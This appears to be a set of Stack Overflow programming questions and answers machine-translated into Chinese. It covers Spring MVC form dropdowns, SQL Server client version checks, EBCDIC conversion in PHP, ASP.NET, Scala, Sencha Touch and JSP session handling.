    private DocumentService documentService;

@RequestMapping(value="/list", method=RequestMethod.GET) 
public String getDocumentRevisionList(Model model) {
    List<DocumentRevision> documentRevisions = documentRevisionService.retrieveAllDocumentRevisions();
    model.addAttribute("documentRevisions", documentRevisions);

    return "document-revision";
}

@RequestMapping(value="/add", method=RequestMethod.GET)
public String getDocumentRevision(Model model) {
    DocumentRevision documentRevision = new DocumentRevision();
    model.addAttribute("documentRevisionAttribute", documentRevision);
    model.addAttribute("documentNumberList", documentService.retrieveAllDocumentNumbers());

    return "new-documnent-revision";
}

@RequestMapping(value="/add", method=RequestMethod.POST)
public String postDocumentRevision(@ModelAttribute("documentRevisionAttribute") @Valid DocumentRevision documentRevision, BindingResult result) {

    if(result.hasErrors()){
        return "new-document-revision";
    }

    documentRevisionService.createDocumentRevision(documentRevision);
    return "redirect:/testapp/document-revision/list";  
}

} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-08T13:58:12.987

```
@ModelAttribute("numberList")
public List<Document> documentNumberList(){
    List<LabelValue> selectItems = new ArrayList<LabelValue>();
    List<Document> docList = documentService.retrieveAllDocumentNumbers();
    for (Document doc : docList) {
     selectItems.add(new LabelValue(doc.id,doc.value));
}
    return selectItems;
} 
```

FYI LabelValue 类是一个简单的 DTO，我们用来携带下拉标签和值项。它将具有标签和值属性，以及相应的 getter/setter。

标签值.java

```
 private String lable;
 private String value;

 //getters/setters 
```

---- JSP -----

```
<tr>
    <td>DocumentNumber</td>
    <td><form:select id="docNo" path="document_number">
           <form:option value="NONE" label="--- Select ---" />
           <form:options items="${numberList}" itemValue="value" itemLabel="lable"/>
         </form:select>
    </td>
    <td><form:errors path="document_number" cssClass="error" /></td>
</tr> 
```

希望这可以帮助..

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-05-08T13:40:05.463

不确定调用了什么控制器方法来显示您的视图`documentNumberList`，但您需要将该集合添加到传递给此视图的模型中：

```
model.addAttribute("documentNumberList", documentService.retrieveAllDocumentNumbers()); 
```

尽管从您的异常堆栈跟踪中您也错过了@Autowired on`documentService`字段。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-04-30T10:26:00.077

我今天自己解决了这种问题。这非常简单易懂。在 Spring MVC 3.0 控制器中，只需放置以下代码 -

```
 @ModelAttribute("creditCardTypes")
 public Map<String,String> populateCreditCardTypes() {
        Map<String,String> creditCardTypes = new LinkedHashMap<String,String>();
        creditCardTypes.put("VS", "Visa");creditCardTypes.put("MC", "MasterCard");
        creditCardTypes.put("AE", "American Express");
        creditCardTypes.put("DS", "Discover");creditCardTypes.put("DC", "Diner's Club");                
        return creditCardTypes;
    } 
```

现在“creditCardTypes”属性将在页面加载或页面提交范围中可用，这意味着无论请求映射 url 是什么，它都可用。

在 jsp 中，将此代码放在 - 信用卡类型中：

```
<form:select path="creditCardType">
    <option value="Select" label="Select a card type"></option>
    <form:options items="${creditCardTypes}" />
</form:select> 
```

这里，path="creditCardType" 表示 Spring MVC 模型/命令对象中的属性，items="${creditCardTypes}" 表示所有填充的信用卡类型都将在 "creditCardTypes" ModelAttribute 中可用。就是这样 ！！！

# sql-server - 检查是否安装了 SQL Server 客户端

> ID：10499643
> 
> 赞同：19
> 
> 时间：2012-05-08T13:31:40.993
> 
> 标签：sql-server, registry

如何检查是否安装了 SQL Server 客户端驱动程序？是否也可以确定版本？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-05-08T13:51:16.853

转到->运行->cmd->键入*regedit.exe*，您会在 ODBC 文件夹下看到注册表：

```
HKEY_LOCAL_MACHINE\SOFTWARE\ODBC\ODBCINST.INI\
    ODBC Drivers\SQL Server 
```

![在此处输入图像描述](../Images/646875d159c032d59c6811c8d3723b5e.png)

我也找到[了关于这个问题的完整答案](https://stackoverflow.com/questions/2050443/with-vba-find-the-version-of-the-the-mysql-odbc-driver-installed-in-windows)，（基于 MySQL，但基本上是一样的）。

稍后编辑：根据您的评论，您已经安装了 2005 版 SQL Server：

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\
Microsoft SQL Native Client\CurrentVersion 
```

无论如何，我还会向您展示如何查看 2008 版本以查看两个版本之间的差异。

**对于 SQL Server 2008/R2：**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\
Microsoft SQL Server\SQLNCLI10\CurrentVersion 
```

**对于 SQL Server 2012：**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\
Microsoft SQL Server\SQLNCLI11\CurrentVersion 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-11-11T14:26:30.363

这可以通过运行找到`odbcad32.exe`。

从[Microsoft 支持站点](https://support.microsoft.com/en-us/kb/321185 "微软支持页面")：

> 要确定 SQL Server Native Client 的版本，请使用以下方法之一：
> 
> 方法 1：在要查找 Native Client 版本的系统上，启动 ODBC Administrator ( `odbcad32.exe`)，然后检查 Drivers 选项卡下的 Version 列。

在 64 位系统上，还要检查`odbcad64.exe`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-03-08T06:30:39.593

是可以通过的`req query`

```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft /f Native*Client /k 
```

结果

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server Native Client 11.0
End of search: 1 match(es) found. 
```

那么你可以通过解析得到准确的数字，例如在python中

```
import os
import re
os.system("reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft /f Native*Client /k > C:\\reg.out")
out=open("C:\\reg.out").read()
ver=re.search("Native Client (\d+)").group(1)
print(ver) 
```

你得到`ver=11` 还有更快的方法

```
code = os.system("reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft /f Native*Client*11 /k > null")
code == 0 # means there is client of version 11
code == 1 # means there is no such client 
```

# sql-server - 如何在 NHibernate 中使用 2 个可能的 FK 设计我的数据库

> ID：10499646
> 
> 赞同：0
> 
> 时间：2012-05-08T13:31:58.843
> 
> 标签：sql-server, database, nhibernate

我正在尝试创建使用宁静服务器来控制多人游戏的游戏

该游戏是一个有 2 名玩家的棋盘游戏，但我怀疑如何创建我的数据库，所以这很有意义

一个玩家将拥有一个 gameID 的外键，但另一个玩家也有（玩家 1 和玩家 2）

所以如果我的游戏模型有类似的东西

```
public virtual GameId {get;set;}
......
public virtual Player1Id {get;set;}
public virtual Player2Id {get;set;} 
```

那么当 PlayerId 可以同时位于游戏模型中的 Player1 和 Player2 位置时，我应该如何创建数据库？FK每次都无法链接到某个位置，这就是我的担心

Ps 我的数据库经验相当有限

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:35:49.917

您的游戏对象不需要 PlayerId。玩家对象需要一个 GameId 来引用它。

这将创建一个一对多的关系。每个游戏都有很多玩家。尽管实际上在您的情况下，您描述的是一场比赛只有两名球员。

另一种选择是将 PlayerOneId 和 PlayerTwoId 作为外键，从而创建两个一对一的关系。

# php - php和html链接错误

> ID：10499652
> 
> 赞同：1
> 
> 时间：2012-05-08T13:32:24.943
> 
> 标签：php, html

我在 php 中回显了这个链接：

```
echo "<a href='$appUrl' class='link-wrapper'></a>"; 
```

$appUrl 给了我这个：

```
http://example.com/cams2/cam3 
```

在点击链接之前，我在 url：

```
http://example.com/cams1 
```

链接html是这样的：

```
<a href="cams2/cam3/" class="link-wrapper"></a> 
```

当我点击网址时..我明白了

```
http://example.com/cams1/cams2/cam3 
```

为什么将 2 个子网址添加到 url..为什么不生成新链接。像这样： `http://example.com/cams2/cam3`？

这是浏览器的行为方式吗？可能是htaccess故障..？我不认为它是..因为当我将鼠标悬停在链接上时，我看到了这个：http://example.com/cams1/cams2/cam3 .. 即使代表的是：

```
http://example.com/cams2/cam3 
```

知道为什么会这样吗？

**更新**

解决了..我这样做了： [http](http://www.example.com/cams2/cam3) ://www.example.com/cams2/cam3 这解决了问题..我怀疑这是一些 htaccess 问题..不知道它为什么会起作用

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:34:06.970

您的链接是相对的，因此它不能针对您想要的地址。我认为您需要在地址前加上一个斜杠

```
<a href="/cams2/cam3/" class="link-wrapper"></a> 
```

所以毕竟，你只是在你的前面加上一个斜杠`$appUrl`

```
echo "<a href='/$appUrl' class='link-wrapper'></a>"; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:34:15.253

您的链接是相对的。在前面添加一个斜线。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-08T13:34:17.030

那是因为 html 链接是相对的。

要使它们绝对化，请在 URL 的开头添加一个斜杠 /。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:35:16.893

是相对路径。它将从当前网址重定向。你需要写`/url/url2/`。它被称为绝对路径。它将从 root 重定向`http://example.com`。

# symfony - 教义关系条件

> ID：10499655
> 
> 赞同：3
> 
> 时间：2012-05-08T13:32:43.260
> 
> 标签：symfony, annotations, doctrine-orm

我正在使用现有数据库进行 Symfony2 项目。

在数据库中有不同的状态，每个状态都有一个类型。例如

```
status  |  type  |  description
   C         O       Completed
   C         G       Cancelled 
```

现在我有一个订单实体，它与状态实体连接。我只想加入状态类型为 O 的订单。

我当前的模型如下所示：

```
/**
 * @ORM\ManyToOne(targetEntity="Statuses", inversedBy="orders")
 * @ORM\JoinColumn(name="status", referencedColumnName="status")
 */
private $status; 
```

我如何指定仅加入类型，所以如果订单的状态为 C，那么我在加入时获得“已完成”状态而不是“已取消”状态？

不幸的是，我无法对数据库结构进行任何更改，因为还有其他应用程序依赖于该结构。

# php - php - 将 ebcdic 转换为 ascii

> ID：10499656
> 
> 赞同：0
> 
> 时间：2012-05-08T13:32:50.167
> 
> 标签：php, sql, ascii, ibm-midrange, ebcdic

```
$my_var = "1";

$connection = db2_connect ( "*LOCAL", "ISCSC", "ISCSC" );

$strSql = 'CALL LMTLIB.ARTEST(?)';

$stmt = db2_prepare ( $connection, $strSql );

db2_bind_param($stmt, 1, "my_var", DB2_PARAM_INOUT, DB2_CHAR);

$rc = db2_execute ( $stmt );

echo $my_var; 
```

当这个代码块执行时，$my_var 的值为 ¦–¦</p>

正在调用的测试 RPGLE 程序正在返回哇

当程序被改变时，我得到的字符是不同的......所以我知道我正在从程序中得到值。唯一的问题是，如何将这些字符从 EBCDIC 转换为 ASCII。

* * *

编辑

我尝试过使用以下内容：

```
mb_convert_encoding($my_var, "ASCII", "cp037");
mb_convert_encoding($my_var, "ASCII", "EBCDIC");
iconv("cp037", "ASCII", $my_var);
iconv("EBCDIC", "ASCII", $my_var); 
```

但我收到此错误：“错误的字符集，不允许从”ebcdic 转换为 ascii“”

并且，“错误的字符集，不允许从”cp037 转换为 ascii“”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-14T17:29:44.890

这适用于我们的几个系统（IBM i v7r1，PHP 版本 5.4.16）：

$ascii_value = iconv("IBM-1047","ISO8859-1", $ebcdic_value); // EBCDIC->ASCII 转换

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:42:33.267

使用以下 PHP 函数：

```
$recoded = recode_string ('EBCDIC..ASCII', $my_var); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T15:46:23.527

在您的 CREATE PROCEDURE 语句中，使用与您的语言匹配的 CCSID。对于美国英语，这将是 37。示例：

```
CREATE PROCEDURE buck.phptest(         
 inout parm_inout varchar (5) ccsid 37)
LANGUAGE RPGLE                         
NOT DETERMINISTIC                      
CALLED ON NULL INPUT                   
EXTERNAL NAME buck.phptest             
PARAMETER STYLE GENERAL 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-28T02:33:19.247

内置函数 EBCDIC 到 ASCII

我必须在窗口环境中这样做

```
 function ebcdic_to_ascii($ebcdic_hexstring /*expecting something like F0F1....*/)
    {
        //need to delcare it to avoid warning
$ebcd_ascii= null;
  // here come all the conversion
$ebcd_ascii["4A"] = "¢";
$ebcd_ascii["4B"] = ".";
$ebcd_ascii["4C"] = "<";
$ebcd_ascii["4D"] = "(";
$ebcd_ascii["4E"] = "+";
$ebcd_ascii["4F"] = "|";
$ebcd_ascii["5A"] = "!";
$ebcd_ascii["5B"] = "$";
$ebcd_ascii["5C"] = "*";
$ebcd_ascii["5D"] = ")";
$ebcd_ascii["5E"] = ";";
$ebcd_ascii["5F"] = "¬";
$ebcd_ascii["60"] = "-";
$ebcd_ascii["61"] = "/";
$ebcd_ascii["6A"] = "¦";
$ebcd_ascii["6B"] = ",";
$ebcd_ascii["6C"] = "%";
$ebcd_ascii["6D"] = "_";
$ebcd_ascii["6E"] = ">";
$ebcd_ascii["6F"] = "?";
$ebcd_ascii["79"] = "`";
$ebcd_ascii["7A"] = ":";
$ebcd_ascii["7B"] = "#";
$ebcd_ascii["7C"] = "@";
$ebcd_ascii["7D"] = "'";
$ebcd_ascii["7E"] = "=";
$ebcd_ascii["7F"] = " '' ";
$ebcd_ascii["81"] = "a";
$ebcd_ascii["82"] = "b";
$ebcd_ascii["83"] = "c";
$ebcd_ascii["84"] = "d";
$ebcd_ascii["85"] = "e";
$ebcd_ascii["86"] = "f";
$ebcd_ascii["87"] = "g";
$ebcd_ascii["88"] = "h";
$ebcd_ascii["89"] = "i";
$ebcd_ascii["91"] = "j";
$ebcd_ascii["92"] = "k";
$ebcd_ascii["93"] = "l";
$ebcd_ascii["94"] = "m";
$ebcd_ascii["95"] = "n";
$ebcd_ascii["96"] = "o";
$ebcd_ascii["97"] = "p";
$ebcd_ascii["98"] = "q";
$ebcd_ascii["99"] = "r";
$ebcd_ascii["A1"] = "~";
$ebcd_ascii["A2"] = "s";
$ebcd_ascii["A3"] = "t";
$ebcd_ascii["A4"] = "u";
$ebcd_ascii["A5"] = "v";
$ebcd_ascii["A6"] = "w";
$ebcd_ascii["A7"] = "x";
$ebcd_ascii["A8"] = "y";
$ebcd_ascii["A9"] = "z";
$ebcd_ascii["C0"] = "{";
$ebcd_ascii["C1"] = "A";
$ebcd_ascii["C2"] = "B";
$ebcd_ascii["C3"] = "C";
$ebcd_ascii["C4"] = "D";
$ebcd_ascii["C5"] = "E";
$ebcd_ascii["C6"] = "F";
$ebcd_ascii["C7"] = "G";
$ebcd_ascii["C7"] = "H";
$ebcd_ascii["C9"] = "I";
$ebcd_ascii["D0"] = "}";
$ebcd_ascii["D1"] = "J";
$ebcd_ascii["D2"] = "K";
$ebcd_ascii["D3"] = "L";
$ebcd_ascii["D4"] = "M";
$ebcd_ascii["D5"] = "N";
$ebcd_ascii["D6"] = "O";
$ebcd_ascii["D7"] = "P";
$ebcd_ascii["D8"] = "Q";
$ebcd_ascii["D9"] = "R";
$ebcd_ascii["E0"] = "\\";
$ebcd_ascii["E2"] = "S";
$ebcd_ascii["E3"] = "T";
$ebcd_ascii["E4"] = "U";
$ebcd_ascii["E5"] = "V";
$ebcd_ascii["E6"] = "W";
$ebcd_ascii["E7"] = "X";
$ebcd_ascii["E8"] = "Y";
$ebcd_ascii["E9"] = "Z";
$ebcd_ascii["F0"] = "0";
$ebcd_ascii["F1"] = "1";
$ebcd_ascii["F2"] = "2";
$ebcd_ascii["F3"] = "3";
$ebcd_ascii["F4"] = "4";
$ebcd_ascii["F5"] = "5";
$ebcd_ascii["F6"] = "6";
$ebcd_ascii["F7"] = "7";
$ebcd_ascii["F8"] = "8";
$ebcd_ascii["F9"] = "9";
$ebcd_ascii["FF"] = "E0";
    //end of conversion

    // loop until there is no more conversion.
    $asciiOut = "";    
    while(strlen($ebcdic_hexstring)>1)//F0F1F2F3F -> F1F2F3F
    {
        $thisEbcdic = substr($ebcdic_hexstring, 0, 2);//F0->F1
        //if(!is_null($ebcd_ascii[$thisEbcdic]))
        $asciiOut = $asciiOut.$ebcd_ascii[$thisEbcdic];//0->01
        $ebcdic_hexstring = substr($ebcdic_hexstring, 2);//F1F2F3F -> F2F3F
    }    

    return $asciiOut;

}

?> 
```

# c# - 如何复制包含数据库数据的 ASP .NET 列表视图？

> ID：10499658
> 
> 赞同：1
> 
> 时间：2012-05-08T13:32:55.457
> 
> 标签：c#, asp.net, listview

我目前正在开发一个 Web 应用程序，它使用不同的约束多次查询一个数据库表。我正在使用 ASP .NET 3.5 ListView。我有大约 10 个不同的列表视图。有没有一种方法可以让我一次查询整个表，然后将它们分成单独的表到 ASP .NET Listviews 中？

有没有办法利用一个查询和输出到多个 ASP .NET 列表视图？或者有没有办法使用 1 个 SQL 数据源，并将其与 2 个 Listview 一起使用？

如果这是不可能的，我可以将 ASP .NET Listview 复制到另一个 ASP .NET listview 吗？我试过这段代码，但我得到一个错误：

```
 private void CopySelectedItems(ListView source, ListView target)
        {
           foreach (ListViewItem item in source.SelectedItems)
           {
               target.Items.Add((ListViewItem)item.Clone());
           }
        } 
```

错误是：

错误 1“System.Web.UI.WebControls.ListView”不包含“SelectedItems”的定义，并且找不到接受“System.Web.UI.WebControls.ListView”类型的第一个参数的扩展方法“SelectedItems”（您是否缺少 using 指令或程序集引用？）

错误 2“System.Web.UI.WebControls.ListViewItem”不包含“Clone”的定义，并且找不到接受“System.Web.UI.WebControls.ListViewItem”类型的第一个参数的扩展方法“Clone”（您是否缺少 using 指令或程序集引用？

错误 3 'System.Collections.Generic.ICollection.Add(System.Web.UI.WebControls.ListViewDataItem)' 的最佳重载方法匹配有一些无效参数

错误 4 参数“1”：无法从“System.Web.UI.WebControls.ListViewItem”转换为“System.Web.UI.WebControls.ListViewDataItem”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T15:03:58.007

您可以将单个数据库查询加载到列表中，然后使用列表`Where`上的扩展方法绑定到您的各个`ListView`控件。

例如，假设数据被加载到`MyDataClass`具有字符串属性的类中`MyProperty1`：

```
List<MyDataClass> myList = MyDataAccessLayer.GetFromDatabase();

ListView1.DataSource = myList.Where(item => item.MyProperty1 == "value1");
ListView1.DataBind();
...
ListView10.DataSource = myList.Where(item => item.MyProperty1 == "value10");
ListView10.DataBind(); 
```

# fonts - 服务器上未安装字体

> ID：10499664
> 
> 赞同：0
> 
> 时间：2012-05-08T13:33:16.347
> 
> 标签：fonts, jvm, jasper-reports

我正在使用 Jasper 报告生成报告。我收到错误消息“JVM 无法使用字体”。我通过在我的系统中安装所需的字体解决了这个问题并且工作正常。但是当我将它部署在服务器上并尝试运行它时，它开始给出同样的错误......！谁能告诉我如何解决它。？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T16:15:51.913

典型示例是，当开发人员在 Windows 上的 iReport 中开发报表时使用 Arial，然后该报表在部署到 Linux 上的 JasperReports Server 时无法运行。一种解决方案是将字体安装在操作系统上，无论您将在何处运行报告。

一个更好的解决方案是使用字体扩展。这是 JasperReports 机制，可确保您拥有所需的字体。几年前我写了一篇关于[字体扩展的文章。](http://mdahlman.wordpress.com/2010/05/28/jaspersoft-v3-7-font-extensions/)这是一个很好的起点。JasperReports 文档也谈到了它。

# java - 是否有任何 java 库可以将访问者函数应用于预泛型集合的多个元素？

> ID：10499665
> 
> 赞同：4
> 
> 时间：2012-05-08T13:33:19.467
> 
> 标签：java, xpath, collections

我处理了很多前泛型，例如以字符串为键的 Maps。他们将键映射到以下类型的值之一：

*   另一张地图
*   一个列表
*   基元包装器

您可以使用**XPath**或类似的查询来访问集合内容：

```
myMap/FIRST_LIST[2]/SECOND_LIST[1]/MY_MAP/MY_PRIMITIVE 
```

我正在寻找的是一个库，它允许我**将访问者函数应用于集合的多个元素**。基本功能可能看起来像这样

```
MyMapBrowser browser = new MyMapBrowser(myMap);
browser.applyVisitor("FIRST_LIST[*]/SECOND_LIST[*]/MY_MAP/MY_PRIMITIVE", 
  new AbstractVisitor<String>() {
    visit(String s) {
         // do something with the strings
    }
}); 
```

如果有可能**首先为不同级别的收藏注册多个访问者，然后开始访问迭代，那**也是很棒的。它可能看起来像这样：

```
browser.registerVisitor(SECOND_LIST, new AbstractVisitor<MyList> { ... )
browser.doVisiting("FIRST_LIST[*]/SECOND_LIST[*]/MY_MAP/MY_PRIMITIVE"); 
```

事实上，我已经开始实现这样的浏览器，但我无法摆脱我正在重新发明轮子的印象。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T16:31:55.063

你看过[JXPath](http://commons.apache.org/jxpath/)吗？它允许您使用 XPath 表达式来查询和操作 Java 对象图。[`JXPathContext`](http://commons.apache.org/jxpath/apidocs/org/apache/commons/jxpath/JXPathContext.html)如果您只想提取字符串值，该类允许您迭代选定节点的值，或者您可以使用该方法`selectNodes`获取 JDOM 包装器。

例如，我*认为*您的示例查询看起来像：

```
// untested
JXPathContext context = JXPathContext.newContext(myMap);
Iterator iter = context.iterate("FIRST_LIST/SECOND_LIST/MY_MAP/MY_PRIMITIVE");
while (iter.hasNext()) {
    String str = (String) iter.next();
    // do something with strings
} 
```

不幸的是，我实际上并没有使用过 JXPath（尽管我之前也尝试过实现类似 XPath 的遍历器），但显然您也可以将其配置为自动为特定路径创建对象。我没有看到任何访问者功能，但是`iterate`,`getValue`和`setValue`应该能够完成同样的事情。您还可以构建一个简单的包装类来运行查询、遍历节点并将值传递给您自己的访问者界面。就像是：

```
public class JXPathVisitBrowser {
    private JXPathContext context;
    public JXPathVisitBrowser(Object object) {
        context = JXPathContext.newContext(object);
    }
    public <T> void applyVisitor(String query, AbstractVisitor<T> visitor) {
        Iterator iter = context.iterate(query);
        while (iter.hasNext())
            visitor.visit((T) iter.next());
    }
} 
```

还有一个非常详细的[JXPath 用户指南](http://commons.apache.org/jxpath/users-guide.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:43:34.297

看看[LambdaJ](http://code.google.com/p/lambdaj/)。我想这就是你要找的。

# c# - 数组：“索引超出了数组的范围”

> ID：10499670
> 
> 赞同：4
> 
> 时间：2012-05-08T13:33:34.097
> 
> 标签：c#, asp.net, arrays, windows-server-2008

我的 Web 应用程序出现以下错误：**“索引超出了数组的范围。”**

奇怪的是，问题只出现在我的网络服务器（Windows Server 2008 R2、.Net 4.0、Windows 7 Enterprise 64 Bit）上。

当我在 Visual Studio 中调试网站时，一切正常

代码如下所示：

我定义了一个数组并将其提供给“CheckUserRights”类

```
string NTLogin = Page.User.Identity.Name.ToString().Split(new char[] { '\\' })[1].ToUpper();
string[] allowedRoles = new string[2] { "Administrator", "Superuser" };
CheckUserRights Check = new CheckUserRights(NTLogin, allowedRoles); 
```

该类如下所示：

```
//Lokale Variablen definieren
string strUserName;
string strRolename;
string[] AllowedRoles;
bool boolAuthorized;

//Im Konstruktor definierte Werte übergeben.
public CheckUserRights(string Username, string[] Roles)
{
    this.strUserName = Username;
    this.AllowedRoles = Roles;
    getRoleForUser();
    checkRights();
}
...
... 
```

我在 4 小时后搜索了解决方案，但我找不到任何东西。我不是专业人士，这是我第一次使用数组。

会不会是服务器上的错误配置？

我很感激每一个帮助。谢谢！

**更新**

解决了，服务器配置有问题。解决方案在史蒂夫的回答中。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T13:54:36.397

该代码中有很多问题，但是，坚持问题标题上的问题，我认为这一行看起来很可疑：

```
string NTLogin = Page.User.Identity.Name.ToString().Split(new char[] { '\\' })[1].ToUpper(); 
```

如果 Page.User.Identity.Name 不包含 DOMAIN\USERNAME，会发生什么？

可以改写为

```
string[] nameparts = Page.User.Identity.Name.ToString().Split(new char[] { '\\' });
string NTLogin = (nameparts.Length == 2 ? nameparts[1] : nameparts[0]).ToUpper();
if(NTLogin.Length == 0)
    return; 
```

为什么这个属性可能是错误？[看看这篇文章](http://forums.asp.net/t/1272477.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:57:42.110

1) 您的代码在 getRoleForUser 中的第一个选择上容易受到 SQL 注入攻击。您应该使用 SqlParameter。

2）没有堆栈跟踪，很难确定错误在哪里。但是，我认为 sql 选择可能会返回 NO ROWS。因此，每当您执行 a 时`r.Read`，将其更改为`if (!r.Read()) return;`.

同样，如果您发布堆栈跟踪，我们可以提供更好的帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-09T04:37:26.583

我如何解决如下：

```
Dim strname() As String
For indx = 0 To (strname.Length - 1)
    If strname(indx) = "" Then
    Else
        ListBox1.Items.Add(strname(indx))
    End If
Next 
```

# performance - 在scala for循环中倒计时

> ID：10499671
> 
> 赞同：4
> 
> 时间：2012-05-08T13:33:36.020
> 
> 标签：performance, scala, scala-2.9, reasoning

> **可能的重复：**
> [在 Scala 中减少 for 循环？](https://stackoverflow.com/questions/9976955/decreasing-for-loop-in-scala)

在使用[Scala For The Impatient](http://horstmann.com/scala/)时，我遇到了以下练习：

```
为 Java 循环编写等效的 Scala
       for (int i = 10; i >= 0; i--) System.out.println(i);

```

我很快就想出了以下解决方案：

```
 for (i <- 1 to 10 reverse) {
       println(i)
   } 
```

然而，这让我想知道如何推断这样做的成本。reverse 方法是对 Range 进行 O(n) 遍历，还是用一些花哨的索引算术来装饰它？还有其他结构可以做得更好吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-08T13:35:00.433

您始终可以选择步骤：

```
for (i <- 10 to 1 by -1) {
       println(i)
} 
```

根据您关于复杂性的问题。您也可以使用 reversed，因为在掩护下，新 Range[将以](https://github.com/scala/scala/blob/v2.9.2/src/library/scala/collection/immutable/Range.scala#L204)相反的顺序创建（这是 O(1) 操作）：

```
final override def reverse: Range =
    if (length > 0) new Range.Inclusive(last, start, -step)
    else this 
```

这是相当恒定的

# checkbox - 如何在 sencha touch 2 中左对齐复选框字段？

> ID：10499677
> 
> 赞同：4
> 
> 时间：2012-05-08T13:33:55.393
> 
> 标签：checkbox, sencha-touch, extjs, sencha-touch-2, fieldset

我只是想知道是否有人能够成功地将字段集中的复选框字段左对齐；我的尝试失败了。

```
{
xtype : 'checkboxfield',
name : 'remember',
label : 'Store information',
style: 'float: left'
} 
```

图片更好：

![在此处输入图像描述](../Images/41dd4850d49feb5646b920402c5c8d43.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T15:02:59.670

我能够将 to`checkboxfield`对齐`left`。看看下面的代码...

```
 {
    xtype: 'checkboxfield',
    name : 'tomato',
    value: 'tomato',
    checked: true,
    label: 'Tomato',
    labelWidth: '70%',
    labelAlign: 'right'
 } 
```

输出：-

![在此处输入图像描述](../Images/0f971d7e0e456521a45f1dbea439e155.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-09-11T07:43:49.697

这是 checkboxfield 默认 css（触摸 2.2.1）：`

```
.x-checkmark-base, .x-field-checkbox .x-field-mask::after, .x-field-radio .x-field-mask::after, .x-select-overlay .x-item-selected.x-list-item::after
{
position: absolute;
top: 0;
right: 10px;
bottom: 0;
content: '3';
font-family: 'Pictos';
font-size: 1.6em;
text-align: right;
line-height: 1.6em;
} 
```

`

您可以将“right:10px”更改为“left:10px”。

在我的应用程序中，我将此 css 代码放在 index.html 中

```
.x-checkmark-base, .x-field-checkbox .x-field-mask::after, .x-field-radio .x-field-mask::after, .x-select-overlay .x-item-selected.x-list-item::after
{
right:auto !important;
left:10px !important;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-09T10:07:10.953

在您的 CSS 中插入以下内容

```
.x-field .x-input-checkbox::after,  .x-field .x-input-checkbox:checked::after
 {
     right:auto;
 } 
```

# jsp - 当会话过期时，如何处理 JSP 中的异常？

> ID：10499683
> 
> 赞同：-1
> 
> 时间：2012-05-08T13:34:09.057
> 
> 标签：jsp, session, struts

我正在研究struts1.3.8。JSP 页面包含用于在会话中迭代数据的脚本。一旦用户打开页面并且在会话过期之前不执行任何操作，然后下次刷新它就会抛出`java.lang.NullPointerException`。

那么如何处理该异常以及如何使会话处于活动状态？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:42:46.213

您可以依赖会话中存在的*众所周知的*属性。

首次创建会话时设置此项。

```
session.setAttribute("well-known-attribute", "abcd"); 
```

在您的 JSP 中，在进行任何迭代之前检查此属性是否存在。

```
if(session.getAttribute("well-known-attribute") != null) {
    // iterate others now
} else {
    session.setAttribute("well-known-attribute", "abcd");
    // now add the other attributes.
} 
```

如果出现以下情况，将[始终创建](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getSession%28%29)一个新会话

*   还没有一个**并且**
*   有一个相关的请求。

# c# - 如何在 WPF 中生成报告？

> ID：10499684
> 
> 赞同：-2
> 
> 时间：2012-05-08T13:34:09.557
> 
> 标签：c#, wpf, dynamic, report

我想知道在 wpf 中生成报告的任何工具。

我想要做的是生成报告并立即将其导出为 pdf、csv 或打印出来。我不希望客户能够从我的应用程序中“调整”报告。报告工具也应该给我很大的自由度，因为我正在根据用户的命令从不断变化的数据网格中生成报告（换句话说......它是动态的）

有谁知道允许我这样做的任何工具（最好是开源工具，但我不认为它是开源的）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:41:17.747

如果您熟悉水晶报表，[这](http://www.codeproject.com/Tips/74499/Crystal-Report-in-WPF)可能对您有用。否则你总是可以使用 xslt 和 xml

[与 xslt“手工制作”报告相比，这个答案](https://stackoverflow.com/questions/479390/microsoft-reporting-vs-xml-xslt)为微软或第三方报告提供了令人信服的论据。

编辑：首先，建议使用水晶报表创建向导

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:41:40.093

报告并不特定于 WPF。您可以查看 Crystal Reports、SSRS Reports（服务器 *.rdl 和客户端嵌入式 *.rdlc）或 DevExpress 的 XtraReports 等公司的工具。

使用[SSRS 报告](http://www.mono-project.com/Libraries#Reporting)的 +1是似乎有一个 Mono 项目可以让您呈现它们，因此如果您有此要求，您不会 100% 绑定到 Microsoft 服务器堆栈。从提供的链接查看 FYI 报告。

* * *

